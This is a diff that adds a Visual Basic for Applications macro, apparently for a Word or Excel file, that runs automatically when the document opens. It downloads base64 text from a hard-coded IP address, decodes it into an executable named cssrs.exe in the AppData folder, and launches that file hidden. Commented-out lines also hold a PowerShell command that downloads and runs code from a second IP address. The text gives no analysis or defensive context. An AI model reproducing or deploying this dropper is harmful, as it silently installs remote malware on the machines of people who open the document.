@@ -1,0 +1,30 @@
+Sub AutoOpen()
+
+    Dim info As String
+    Dim infoBytes() As Byte
+    Dim httpRequest, httpBinary As Object
+    Dim pid As Double
+    Set httpRequest = CreateObject("Microsoft.XMLHTTP")
+    Set httpBinary = CreateObject("ADODB.Stream")
+
+    httpRequest.Open "GET", "http://64.137.165.77/thankyoucard.txt"
+    httpRequest.send
+    Pause (5)
+    httpBinary.Open
+    httpBinary.Type = 1
+    'MsgBox (httpRequest.responseText)
+    info = Decode64(httpRequest.responseText)
+    infoBytes = StrConv(info, vbFromUnicode)
+    httpBinary.Write infoBytes
+    Dim fileName As String
+    fileName = Environ("AppData") & "\microsoft\cssrs.exe"
+    httpBinary.SaveToFile fileName, 2
+    httpBinary.Close
+    pid = Shell(fileName, vbHide)
+    
+    
+    'info = "powershell.exe ""IEX((new-object net.webclient).downloadstring('http://104.233.107.148/pullexe'))"""
+    'info = "powershell.exe ""IEX 'Get-Process'"""
+    'pid = Shell(info, vbMaximizedFocus)
+    
+End Sub
